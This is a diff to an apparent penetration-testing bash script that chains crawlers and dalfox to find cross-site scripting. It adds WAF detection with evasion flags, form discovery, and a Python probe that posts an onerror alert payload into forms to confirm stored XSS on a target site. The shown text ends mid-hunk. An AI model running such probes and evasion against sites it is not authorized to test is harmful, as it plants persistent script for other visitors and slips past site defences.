@@ -43,7 +43,7 @@ banner() {
 # ── Dependency Check ───────────────────────────────────────────
 check_deps() {
     local missing=0
-    for cmd in katana arjun dalfox python3; do
+    for cmd in katana arjun dalfox python3 wafw00f; do
         if command -v "$cmd" &>/dev/null; then
             local ver
             case "$cmd" in
@@ -51,6 +51,7 @@ check_deps() {
                 arjun)   ver=$(pipx list 2>/dev/null | grep -oP 'arjun \K[\d.]+' || echo "?") ;;
                 dalfox)  ver=$(dalfox --version 2>&1 | head -1) ;;
                 python3) ver=$(python3 --version 2>&1) ;;
+                wafw00f) ver=$(wafw00f -V 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oP 'v[\d.]+' | head -1) ;;
             esac
             log_ok "$cmd ${DIM}($ver)${RESET}"
         else
@@ -88,6 +89,7 @@ FEATURES
     --proxy <url>             Proxy for all tools (http/socks5)
     --waf                     Enable WAF evasion across pipeline
     --passive                 Enable arjun passive recon (wayback/commoncrawl)
+    --stored                  Probe for stored XSS (submit+verify on render pages)
 
 PHASE CONTROL
     --skip-crawl              Skip katana crawl phase
@@ -223,7 +225,7 @@ trap cleanup SIGINT SIGTERM
 TARGET=""  HEADER_ARGS=()  PROFILE="standard"
 BLIND_URL=""  OOB=0  SXSS_URL=""  PROXY=""  WAF=0  PASSIVE=0
 OUTDIR=""  FORMAT="plain"  QUIET=0  VERBOSE=0  NO_COLOR=""  THREADS=0  SONIC=0
-SKIP_CRAWL=0  SKIP_ARJUN=0  SKIP_SCAN=0  CRAWL_FILE=""  ALL=0
+SKIP_CRAWL=0  SKIP_ARJUN=0  SKIP_SCAN=0  CRAWL_FILE=""  ALL=0  STORED=0
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -246,6 +248,7 @@ while [[ $# -gt 0 ]]; do
         --proxy=*)          PROXY="${1#*=}"; shift ;;
         --waf)              WAF=1; shift ;;
         --passive)          PASSIVE=1; shift ;;
+        --stored)           STORED=1; shift ;;
         -o|--output-dir)    OUTDIR="$2"; shift 2 ;;
         --output-dir=*)     OUTDIR="${1#*=}"; shift ;;
         -f|--format)        FORMAT="$2"; shift 2 ;;
@@ -275,6 +278,23 @@ banner
 
 TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||;s|[/:?#].*||')
 
+# ── Connectivity check: detect scheme mismatch ───────────────
+if ! curl -sk --head --max-time 5 "$TARGET" -o /dev/null 2>/dev/null; then
+    if [[ "$TARGET" =~ ^http:// ]]; then
+        ALT="${TARGET/http:\/\//https:\/\/}"
+    else
+        ALT="${TARGET/https:\/\//http:\/\/}"
+    fi
+    if curl -sk --head --max-time 5 "$ALT" -o /dev/null 2>/dev/null; then
+        log_warn "Target unreachable at $TARGET — switching to $ALT"
+        TARGET="$ALT"
+        TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||;s|[/:?#].*||')
+    else
+        log_err "Target unreachable at both $TARGET and $ALT"
+        exit 1
+    fi
+fi
+
 case "$FORMAT" in
     plain)    FMT_EXT="txt" ;;
     json)     FMT_EXT="json" ;;
@@ -303,6 +323,36 @@ apply_profile
 build_headers
 check_deps
 
+# ── WAF detection (wafw00f) ───────────────────────────────────
+WAF_JSON=$(wafw00f "$TARGET" ${PROXY:+-p "$PROXY"} -o - -f json 2>/dev/null || true)
+WAF_DETECTED=$(echo "$WAF_JSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d[0].get('firewall','None') if d[0].get('detected') else '')" 2>/dev/null || true)
+WAF_VENDOR=$(echo "$WAF_JSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d[0].get('manufacturer','') if d[0].get('detected') else '')" 2>/dev/null || true)
+echo "$WAF_JSON" > "$OUTDIR/wafw00f.json" 2>/dev/null
+
+if [[ -n "$WAF_DETECTED" ]]; then
+    WAF_LABEL="$WAF_DETECTED"
+    [[ -n "$WAF_VENDOR" && "$WAF_VENDOR" != "None" ]] && WAF_LABEL+=" ($WAF_VENDOR)"
+    if [[ "${WAF:-0}" -eq 1 ]]; then
+        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET} ${DIM}(--waf already enabled)${RESET}"
+    elif [[ -t 0 ]]; then
+        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET}"
+        printf "    Enable WAF evasion mode? [Y/n] " >&2
+        read -r WAF_REPLY < /dev/tty 2>/dev/null || WAF_REPLY=""
+        if [[ -z "$WAF_REPLY" || "$WAF_REPLY" =~ ^[Yy] ]]; then
+            WAF=1
+            KAT_EXTRA+=" -tlsi"
+            ARJ_EXTRA+=" --stable"
+            DFX_EXTRA+=" --waf-evasion --hpp"
+            (( DFX_WRK > 15 )) && DFX_WRK=15
+            log_ok "WAF evasion enabled"
+        fi
+    else
+        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET} ${DIM}(use --waf to enable evasion)${RESET}"
+    fi
+else
+    log_ok "No WAF detected"
+fi
+
 [[ ${#HEADER_ARGS[@]} -eq 0 ]] && log_warn "No headers set (-H) — target may require authentication"
 
 # ── --all: run all profiles and merge ─────────────────────────
@@ -321,6 +371,7 @@ if [[ $ALL -eq 1 ]]; then
     [[ -n "$PROXY" ]] && PASSTHROUGH+=(--proxy "$PROXY")
     [[ $WAF -eq 1 ]] && PASSTHROUGH+=(--waf)
     [[ $PASSIVE -eq 1 ]] && PASSTHROUGH+=(--passive)
+    [[ $STORED -eq 1 ]] && PASSTHROUGH+=(--stored)
     [[ "$FORMAT" != "plain" ]] && PASSTHROUGH+=(-f "$FORMAT")
     [[ $SKIP_CRAWL -eq 1 ]] && PASSTHROUGH+=(--skip-crawl)
     [[ $SKIP_ARJUN -eq 1 ]] && PASSTHROUGH+=(--skip-arjun)
@@ -455,9 +506,9 @@ PYEOF
     # Stored XSS on merged crawled URLs
     SXSS_FILE="$OUTDIR/stored_xss_candidates.txt"
     SXSS_COUNT=0
-    if [[ -s "$OUTDIR/merged_crawled.txt" ]]; then
+    if [[ $STORED -eq 1 && -s "$OUTDIR/merged_crawled.txt" ]]; then
         python3 << 'PYEOF' - "$OUTDIR/merged_crawled.txt" "$SXSS_FILE" "${DALFOX_H[1]:-}"
-import sys, re, urllib.request, urllib.error, ssl
+import sys, re, urllib.request, urllib.error, urllib.parse, ssl
 
 crawled_file = sys.argv[1]
 output_file = sys.argv[2]
@@ -469,29 +520,49 @@ ctx.verify_mode = ssl.CERT_NONE
 
 text_types = {'text', 'search', 'url', 'email', 'tel', 'number', ''}
 skip_names = {'csrf', 'token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', '__requestverificationtoken'}
-skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password'}
+skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password', 'reset-password', 'forgot-password'}
 
-with open(crawled_file) as f:
-    urls = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))
-
-candidates = []
-seen = set()
-
-for url in urls:
+def fetch(url):
     try:
         req = urllib.request.Request(url)
         if header:
             k, v = header.split(':', 1)
             req.add_header(k.strip(), v.strip())
         resp = urllib.request.urlopen(req, timeout=8, context=ctx)
-        html = resp.read().decode('utf-8', errors='replace')
+        return resp.read().decode('utf-8', errors='replace')
     except Exception:
+        return ''
+
+with open(crawled_file) as f:
+    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))
+
+parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
+base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''
+
+all_urls = set(crawled)
+to_visit = list(crawled)
+for depth in range(2):
+    new_found = []
+    for url in to_visit:
+        html = fetch(url)
+        if not html:
+            continue
+        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
+            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
+            if full.startswith(base_url) and full not in all_urls:
+                all_urls.add(full)
+                new_found.append(full)
+    to_visit = new_found
+
+all_urls = sorted(all_urls)
+candidates = []
+seen = set()
+
+for url in all_urls:
+    html = fetch(url)
+    if not html:
         continue
-
-    forms = re.finditer(
-        r'<form\b[^>]*>(.*?)</form>',
-        html, re.DOTALL | re.IGNORECASE)
-
+    forms = re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
     for fm in forms:
         form_tag = fm.group(0)
         form_head = re.match(r'<form\b[^>]*>', form_tag, re.IGNORECASE).group(0)
@@ -499,18 +570,16 @@ for url in urls:
         method = method.group(1).upper() if method else 'GET'
         if method != 'POST':
             continue
-
         action = re.search(r'action=["\']([^"\']*)', form_head, re.IGNORECASE)
         action = action.group(1) if action else url
-
         body = fm.group(1)
         fields = []
-
+        select_fields = []
         for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
             tag = inp.group(0)
             itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
             itype = itype.group(1).lower() if itype else ''
-            if itype == 'hidden' or itype == 'submit' or itype == 'button':
+            if itype in ('hidden', 'submit', 'button', 'file'):
                 continue
             iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
             if not iname:
@@ -520,12 +589,14 @@ for url in urls:
                 continue
             if itype in text_types:
                 fields.append((name, 'input', itype or 'text'))
-
         for ta in re.finditer(r'<textarea\b[^>]*name=["\']([^"\']*)[^>]*>', body, re.IGNORECASE):
             name = ta.group(1)
             if name.lower() not in skip_names:
                 fields.append((name, 'textarea', ''))
-
+        for sel in re.finditer(r'<select\b[^>]*name=["\']([^"\']*)[^>]*>(.*?)</select>', body, re.DOTALL | re.IGNORECASE):
+            sname = sel.group(1)
+            opts = re.findall(r'value=["\']([^"\']*)', sel.group(2))
+            select_fields.append((sname, opts))
         if not fields:
             continue
         action_path = action.rstrip('/').rsplit('/', 1)[-1].lower()
@@ -534,7 +605,7 @@ for url in urls:
         key = (url, action, tuple(f[0] for f in fields))
         if key not in seen:
             seen.add(key)
-            candidates.append((url, action, method, fields))
+            candidates.append((url, action, method, fields, select_fields))
 
 if candidates:
     with open(output_file, 'w') as f:
@@ -544,7 +615,7 @@ if candidates:
         f.write("and rendered elsewhere. Test each with a unique payload\n")
         f.write("(e.g. <img src=x onerror=alert('FORMNAME')>) and check\n")
         f.write("where the value appears on other pages.\n\n")
-        for url, action, method, fields in candidates:
+        for url, action, method, fields, selects in candidates:
             f.write(f"Page    : {url}\n")
             f.write(f"Action  : {action}\n")
             f.write(f"Method  : {method}\n")
@@ -553,6 +624,8 @@ if candidates:
                 if itype:
                     label = f"{tag} type={itype}"
                 f.write(f"  Field : {name} ({label})\n")
+            for sname, opts in selects:
+                f.write(f"  Select: {sname} (options={','.join(opts[:5])})\n")
             f.write("\n")
 PYEOF
         [[ -s "$SXSS_FILE" ]] && SXSS_COUNT=$(grep -c '^Page' "$SXSS_FILE" 2>/dev/null || true)
@@ -808,6 +881,90 @@ else
         [[ -s "$OUTDIR/crawled.txt" ]] && cp "$OUTDIR/crawled.txt" "$OUTDIR/targets.txt"
     fi
 
+    # ── GET form discovery: extract search/filter forms katana missed ──
+    if [[ -s "$OUTDIR/crawled.txt" ]]; then
+        GET_FORMS=$(python3 << 'PYEOF' - "$OUTDIR/crawled.txt" "${DALFOX_H[1]:-}"
+import sys, re, urllib.request, urllib.parse, ssl
+
+crawled_file = sys.argv[1]
+header = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else None
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+def fetch(url):
+    try:
+        req = urllib.request.Request(url)
+        if header:
+            k, v = header.split(':', 1)
+            req.add_header(k.strip(), v.strip())
+        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
+        return resp.read().decode('utf-8', errors='replace')
+    except Exception:
+        return ''
+
+with open(crawled_file) as f:
+    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))
+
+parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
+base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''
+
+all_urls = set(crawled)
+to_visit = list(crawled)
+for depth in range(2):
+    new_found = []
+    for url in to_visit:
+        html = fetch(url)
+        if not html:
+            continue
+        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
+            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
+            if full.startswith(base_url) and full not in all_urls:
+                all_urls.add(full)
+                new_found.append(full)
+    to_visit = new_found
+
+seen = set()
+for url in sorted(all_urls):
+    html = fetch(url)
+    if not html:
+        continue
+    for fm in re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
+        form_head = re.match(r'<form\b[^>]*>', fm.group(0), re.IGNORECASE).group(0)
+        method = re.search(r'method=["\']?(\w+)', form_head, re.IGNORECASE)
+        method = method.group(1).upper() if method else 'GET'
+        if method != 'GET':
+            continue
+        action = re.search(r'action=["\']([^"\']*)', form_head, re.IGNORECASE)
+        action_url = urllib.parse.urljoin(url, action.group(1)) if action else url
+        body = fm.group(1)
+        params = []
+        for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
+            tag = inp.group(0)
+            itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
+            itype = itype.group(1).lower() if itype else ''
+            if itype in ('hidden', 'submit', 'button'):
+                continue
+            iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
+            if iname:
+                params.append(f"{iname.group(1)}=FUZZ")
+        if params:
+            target = action_url.split('?')[0] + '?' + '&'.join(params)
+            if target not in seen:
+                seen.add(target)
+                print(target)
+PYEOF
+        )
+        if [[ -n "$GET_FORMS" ]]; then
+            GET_COUNT=$(echo "$GET_FORMS" | wc -l)
+            echo "$GET_FORMS" >> "$OUTDIR/targets.txt"
+            sort -u -o "$OUTDIR/targets.txt" "$OUTDIR/targets.txt"
+            TOTAL_TARGETS=$(wc -l < "$OUTDIR/targets.txt")
+            log_ok "$GET_COUNT GET form targets discovered, $TOTAL_TARGETS total targets"
+        fi
+    fi
+
     if [[ $SKIP_SCAN -eq 0 ]]; then
         INPUT="$OUTDIR/targets.txt"
         [[ ! -s "$INPUT" ]] && INPUT="$OUTDIR/crawled.txt"
@@ -940,9 +1097,9 @@ fi
 # ── Stored XSS candidate discovery ───────────────────────────
 SXSS_FILE="$OUTDIR/stored_xss_candidates.txt"
 SXSS_COUNT=0
-if [[ -s "$OUTDIR/crawled.txt" ]]; then
+if [[ $STORED -eq 1 && -s "$OUTDIR/crawled.txt" ]]; then
     python3 << 'PYEOF' - "$OUTDIR/crawled.txt" "$SXSS_FILE" "${DALFOX_H[1]:-}"
-import sys, re, urllib.request, urllib.error, ssl
+import sys, re, urllib.request, urllib.error, urllib.parse, ssl
 
 crawled_file = sys.argv[1]
 output_file = sys.argv[2]
@@ -954,23 +1111,49 @@ ctx.verify_mode = ssl.CERT_NONE
 
 text_types = {'text', 'search', 'url', 'email', 'tel', 'number', ''}
 skip_names = {'csrf', 'token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', '__requestverificationtoken'}
-skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password'}
+skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password', 'reset-password', 'forgot-password'}
 
-with open(crawled_file) as f:
-    urls = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))
-
-candidates = []
-seen = set()
-
-for url in urls:
+def fetch(url):
     try:
         req = urllib.request.Request(url)
         if header:
             k, v = header.split(':', 1)
             req.add_header(k.strip(), v.strip())
         resp = urllib.request.urlopen(req, timeout=8, context=ctx)
-        html = resp.read().decode('utf-8', errors='replace')
+        return resp.read().decode('utf-8', errors='replace')
     except Exception:
+        return ''
+
+with open(crawled_file) as f:
+    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))
+
+parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
+base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''
+
+# Follow internal links two levels deep to discover forms katana missed
+all_urls = set(crawled)
+to_visit = list(crawled)
+for depth in range(2):
+    new_found = []
+    for url in to_visit:
+        html = fetch(url)
+        if not html:
+            continue
+        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
+            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
+            if full.startswith(base_url) and full not in all_urls:
+                all_urls.add(full)
+                new_found.append(full)
+    to_visit = new_found
+
+all_urls = sorted(all_urls)
+
+candidates = []
+seen = set()
+
+for url in all_urls:
+    html = fetch(url)
+    if not html:
         continue
 
     forms = re.finditer(
@@ -990,12 +1173,13 @@ for url in urls:
 
         body = fm.group(1)
         fields = []
+        select_fields = []
 
         for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
             tag = inp.group(0)
             itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
             itype = itype.group(1).lower() if itype else ''
-            if itype == 'hidden' or itype == 'submit' or itype == 'button':
+            if itype in ('hidden', 'submit', 'button', 'file'):
                 continue
             iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
             if not iname:
@@ -1011,6 +1195,11 @@ for url in urls:
             if name.lower() not in skip_names:
                 fields.append((name, 'textarea', ''))
 
+        for sel in re.finditer(r'<select\b[^>]*name=["\']([^"\']*)[^>]*>(.*?)</select>', body, re.DOTALL | re.IGNORECASE):
+            sname = sel.group(1)
+            opts = re.findall(r'value=["\']([^"\']*)', sel.group(2))
+            select_fields.append((sname, opts))
+
         if not fields:
             continue
         action_path = action.rstrip('/').rsplit('/', 1)[-1].lower()
@@ -1019,7 +1208,7 @@ for url in urls:
         key = (url, action, tuple(f[0] for f in fields))
         if key not in seen:
             seen.add(key)
-            candidates.append((url, action, method, fields))
+            candidates.append((url, action, method, fields, select_fields))
 
 if candidates:
     with open(output_file, 'w') as f:
@@ -1029,7 +1218,7 @@ if candidates:
         f.write("and rendered elsewhere. Test each with a unique payload\n")
         f.write("(e.g. <img src=x onerror=alert('FORMNAME')>) and check\n")
         f.write("where the value appears on other pages.\n\n")
-        for url, action, method, fields in candidates:
+        for url, action, method, fields, selects in candidates:
             f.write(f"Page    : {url}\n")
             f.write(f"Action  : {action}\n")
             f.write(f"Method  : {method}\n")
@@ -1038,6 +1227,8 @@ if candidates:
                 if itype:
                     label = f"{tag} type={itype}"
                 f.write(f"  Field : {name} ({label})\n")
+            for sname, opts in selects:
+                f.write(f"  Select: {sname} (options={','.join(opts[:5])})\n")
             f.write("\n")
 else:
     pass
@@ -1046,16 +1237,317 @@ PYEOF
     (( SXSS_COUNT > 0 )) && log_ok "$SXSS_COUNT stored XSS candidates → ${DIM}$SXSS_FILE${RESET}"
 fi
 
+# ── Stored XSS probe ─────────────────────────────────────────
+SXSS_VERIFIED=0
+if [[ $STORED -eq 1 && -s "$SXSS_FILE" && ${#DALFOX_H[@]} -gt 0 ]]; then
+    log_info "Probing stored XSS candidates..."
+
+    SXSS_VERIFIED=$(CB_VERBOSE=$VERBOSE python3 << 'PYEOF' - "$SXSS_FILE" "$RESULTS_FILE" "${DALFOX_H[@]}"
+import sys, os, re, random, string, urllib.request, urllib.parse, urllib.error, ssl, time, json, base64
+
+VERBOSE = os.environ.get('CB_VERBOSE') == '1'
+def dbg(msg):
+    if VERBOSE:
+        print(f'  [DBG] {msg}', file=sys.stderr)
+
+sxss_file = sys.argv[1]
+results_file = sys.argv[2]
+raw_headers = sys.argv[3:]
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+headers = {}
+i = 0
+while i < len(raw_headers):
+    if raw_headers[i] == '-H' and i + 1 < len(raw_headers):
+        h = raw_headers[i + 1]
+        if ':' in h:
+            k, v = h.split(':', 1)
+            headers[k.strip()] = v.strip()
+        i += 2
+    else:
+        i += 1
+
+# Try to extract username from session cookie for self-messaging
+auth_user = None
+cookie_val = headers.get('Cookie', '')
+for part in cookie_val.split(';'):
+    part = part.strip()
+    if part.startswith('session='):
+        tok = part.split('=', 1)[1].split('.')[0]
+        try:
+            pad = tok + '=' * (-len(tok) % 4)
+            data = json.loads(base64.b64decode(pad))
+            auth_user = data.get('username')
+        except Exception:
+            pass
+
+class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+def get(url):
+    req = urllib.request.Request(url)
+    for k, v in headers.items():
+        req.add_header(k, v)
+    try:
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+        return resp.read().decode('utf-8', errors='replace')
+    except Exception:
+        return ''
+
+def post_no_redirect(url, data):
+    encoded = urllib.parse.urlencode(data).encode()
+    opener = urllib.request.build_opener(NoRedirectHandler)
+    req = urllib.request.Request(url, data=encoded, method='POST')
+    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+    for k, v in headers.items():
+        req.add_header(k, v)
+    try:
+        resp = opener.open(req, timeout=10)
+        return resp.headers.get('Location', ''), resp.code
+    except urllib.error.HTTPError as e:
+        return e.headers.get('Location', ''), e.code
+    except Exception:
+        return '', 0
+
+def resolve(base, rel):
+    if not rel:
+        return ''
+    if rel.startswith('http'):
+        return rel
+    return urllib.parse.urljoin(base, rel)
+
+# Parse candidates file — now handles Select: lines too
+candidates = []
+current = None
+with open(sxss_file) as f:
+    for line in f:
+        line = line.rstrip()
+        if line.startswith('Page'):
+            if current:
+                candidates.append(current)
+            current = {'page': line.split(':', 1)[1].strip(), 'fields': [], 'selects': {}}
+        elif line.startswith('Action') and current:
+            current['action'] = line.split(':', 1)[1].strip()
+        elif line.startswith('Method') and current:
+            current['method'] = line.split(':', 1)[1].strip()
+        elif line.strip().startswith('Field') and current:
+            m = re.match(r'\s*Field\s*:\s*(\S+)', line)
+            if m:
+                fname = m.group(1)
+                if 'password' not in line.lower():
+                    current['fields'].append(fname)
+        elif line.strip().startswith('Select') and current:
+            m = re.match(r'\s*Select\s*:\s*(\S+)\s*\(options=(.*)\)', line)
+            if m:
+                sname = m.group(1)
+                opts = [o.strip() for o in m.group(2).split(',') if o.strip()]
+                current['selects'][sname] = opts
+    if current:
+        candidates.append(current)
+
+findings = []
+tested_patterns = set()
+marker_base = 'cbsxss' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+def action_pattern(url, fields):
+    path = urllib.parse.urlparse(url).path
+    norm = re.sub(r'/\d+', '/*', path)
+    return (norm, tuple(sorted(fields)))
+
+dbg(f"Parsed {len(candidates)} candidates, auth_user={auth_user}")
+
+for cand in candidates:
+    if cand.get('method', '') != 'POST':
+        continue
+    action = cand.get('action', '')
+    if not action:
+        continue
+    action_url = resolve(cand['page'], action)
+    text_fields = [f for f in cand.get('fields', [])]
+    if not text_fields:
+        continue
+    pat = action_pattern(action_url, text_fields)
+    if pat in tested_patterns:
+        dbg(f"SKIP (dedup) {action_url} fields={text_fields}")
+        continue
+    tested_patterns.add(pat)
+
+    marker = marker_base + ''.join(random.choices(string.digits, k=4))
+    dbg(f"--- {action_url} fields={text_fields} marker={marker}")
+
+    # Build POST data: marker in text fields, sensible defaults for selects
+    post_data = {f: marker for f in text_fields}
+    for sname, opts in cand.get('selects', {}).items():
+        if sname == 'to_user' and auth_user:
+            post_data[sname] = auth_user
+        elif sname == 'rating':
+            post_data[sname] = '5'
+        elif opts:
+            post_data[sname] = opts[0]
+
+    redirect_loc, status = post_no_redirect(action_url, post_data)
+    dbg(f"  POST {status} → redirect={redirect_loc}")
+    time.sleep(0.3)
+
+    # Build list of URLs to check for the marker
+    check_urls = []
+    if redirect_loc:
+        rurl = resolve(action_url, redirect_loc)
+        if rurl:
+            check_urls.append(rurl)
+            # Also follow one more redirect from the redirect target
+            redirect_body = get(rurl)
+            if marker in redirect_body:
+                check_urls = [rurl]
+            else:
+                # Check detail links from the redirect page (listing → detail)
+                for href in re.findall(r'href="([^"#]*)"', redirect_body):
+                    full = resolve(rurl, href)
+                    if full.startswith(action_url.rsplit('/', 2)[0]) and full != rurl:
+                        check_urls.append(full)
+    check_urls.append(cand['page'])
+    # Parent of action URL (e.g., /products/1/review → /products/1)
+    parent = action_url.rstrip('/').rsplit('/', 1)[0]
+    if parent and parent not in check_urls:
+        check_urls.append(parent)
+
+    # Deduplicate while preserving order
+    seen_urls = set()
+    unique_urls = []
+    for u in check_urls:
+        if u not in seen_urls:
+            seen_urls.add(u)
+            unique_urls.append(u)
+    check_urls = unique_urls
+
+    found_url = None
+    for url in check_urls:
+        body = get(url)
+        found = marker in body
+        dbg(f"  CHECK {url} → marker={'FOUND' if found else 'no'} (len={len(body)})")
+        if found:
+            found_url = url
+            # If this is a listing page, check detail links for the marker too
+            for href in re.findall(r'href="([^"#]*)"', body):
+                full = resolve(url, href)
+                if full != url and full not in seen_urls:
+                    detail = get(full)
+                    if marker in detail:
+                        dbg(f"  → detail page: {full}")
+                        found_url = full
+                        break
+            break
+
+    if not found_url:
+        dbg(f"  SKIP: marker not found on any page")
+        continue
+
+    # Test each text field individually for XSS
+    for field in text_fields:
+        xss_id = 'cbv' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        payload = f'<img src=x onerror=alert(1) class={xss_id}>'
+        dbg(f"  TEST field={field} xss_id={xss_id}")
+
+        test_data = {f: 'crossbow_safe' for f in text_fields}
+        test_data[field] = payload
+        for sname, opts in cand.get('selects', {}).items():
+            if sname == 'to_user' and auth_user:
+                test_data[sname] = auth_user
+            elif sname == 'rating':
+                test_data[sname] = '5'
+            elif opts:
+                test_data[sname] = opts[0]
+
+        xss_redirect, _ = post_no_redirect(action_url, test_data)
+        time.sleep(0.3)
+
+        render_url = found_url
+        body = get(render_url)
+
+        if f'class={xss_id}>' not in body:
+            # Check the redirect target from the XSS POST (new entry URL)
+            if xss_redirect:
+                rurl = resolve(action_url, xss_redirect)
+                if rurl and rurl != render_url:
+                    rbody = get(rurl)
+                    if f'class={xss_id}>' in rbody:
+                        render_url = rurl
+                        body = rbody
+                    else:
+                        # Check detail links from redirect (listing) page
+                        for href in re.findall(r'href="([^"#]*)"', rbody):
+                            full = resolve(rurl, href)
+                            if full != rurl:
+                                detail = get(full)
+                                if f'class={xss_id}>' in detail:
+                                    render_url = full
+                                    body = detail
+                                    break
+            # Also check detail links from found_url
+            if f'class={xss_id}>' not in body:
+                for href in re.findall(r'href="([^"#]*)"', get(found_url)):
+                    full = resolve(found_url, href)
+                    if full != found_url:
+                        detail = get(full)
+                        if f'class={xss_id}>' in detail:
+                            render_url = full
+                            body = detail
+                            break
+
+        confirmed = f'class={xss_id}>' in body
+        dbg(f"    → {'CONFIRMED at ' + render_url if confirmed else 'not vulnerable'}")
+
+        if confirmed:
+            findings.append({
+                'render_url': render_url,
+                'inject_url': action_url,
+                'field': field,
+                'payload': payload
+            })
+
+R = '\033[0m'
+DIM = '\033[90m'
+GR = '\033[38;5;247m'
+GRN = '\033[32m'
+RED = '\033[31m'
+
+if findings:
+    with open(results_file, 'a') as f:
+        f.write(f'\n{DIM}--- crossbow stored XSS: {len(findings)} finding(s) verified ---{R}\n\n')
+        for fi in findings:
+            f.write(f'{GRN}[CB][SXSS][V][POST]{R} {RED}{fi["render_url"]}{R}\n')
+            f.write(f'  {DIM}├──{R} {GR}Issue:{R} {GR}stored XSS — payload persists and executes for all visitors{R}\n')
+            f.write(f'  {DIM}├──{R} {GR}Inject:{R} {GR}POST {fi["inject_url"]} → field: {fi["field"]}{R}\n')
+            f.write(f'  {DIM}├──{R} {GR}Renders:{R} {GR}{fi["render_url"]} (unescaped){R}\n')
+            f.write(f'  {DIM}└──{R} {GR}Payload:{R} {GR}{fi["payload"]}{R}\n\n')
+    print(len(findings), end='')
+else:
+    print(0, end='')
+PYEOF
+    )
+
+    if [[ $SXSS_VERIFIED -gt 0 ]]; then
+        log_ok "$SXSS_VERIFIED stored XSS verified ${DIM}(crossbow probe)${RESET}"
+    else
+        log_info "No stored XSS confirmed"
+    fi
+fi
+
 # ── Summary ────────────────────────────────────────────────────
 TOTAL_TIME=$(elapsed $TOTAL_START)
 
-V=0  R=0  A=0  CB=0
+V=0  R=0  A=0  CB=0  SXSS_V=${SXSS_VERIFIED:-0}
 if [[ -s "$RESULTS_FILE" ]]; then
     if [[ "$FORMAT" == "plain" ]]; then
         V=$(grep -c '\[POC\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
         R=$(grep -c '\[POC\]\[R\]' "$RESULTS_FILE" 2>/dev/null || true)
         A=$(grep -c '\[POC\]\[A\]' "$RESULTS_FILE" 2>/dev/null || true)
         CB=$(grep -c '\[CB\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
+        SXSS_V=$(grep -c '\[CB\]\[SXSS\]\[V\]' "$RESULTS_FILE" 2>/dev/null || true)
     fi
 fi
 TOTAL_FINDINGS=$((V + R + A))
@@ -1068,17 +1560,24 @@ echo -e "  Target  : ${BOLD}$TARGET${RESET}" >&2
 echo -e "  Profile : $PROFILE" >&2
 echo -e "  Time    : $TOTAL_TIME" >&2
 echo -e "" >&2
-if [[ "$FORMAT" == "plain" && $SKIP_SCAN -eq 0 ]]; then
-    [[ $V -gt 0 ]] && VC="${RED}${BOLD}$V${RESET}" || VC="$V"
-    [[ $R -gt 0 ]] && RC="${YELLOW}$R${RESET}" || RC="$R"
-    [[ $A -gt 0 ]] && AC="${CYAN}$A${RESET}" || AC="$A"
-    echo -e "  ${RED}[V]${RESET} Verified  : $VC" >&2
-    echo -e "  ${YELLOW}[R]${RESET} Reflected : $RC" >&2
-    echo -e "  ${CYAN}[A]${RESET} DOM (AST) : $AC" >&2
-    if [[ $CB -gt 0 ]]; then
